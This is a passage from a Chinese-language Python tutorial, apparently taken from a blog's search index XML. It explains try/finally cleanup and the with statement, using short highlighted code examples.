class="keyword">raise</span></span><br></pre></td></tr></table></figure>

<p>try 语句还有另外一个可选的子句<code>finally</code>，它定义了无论在任何情况下都会执行的清理行为。</p>
<p>有一种 <code>with 语句</code>也能以清晰的方式完成这样的功能。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> KeyboardInterrupt</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    print(<span class="string">'Goodbye, world!'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"poem.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        print(line,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
</search>
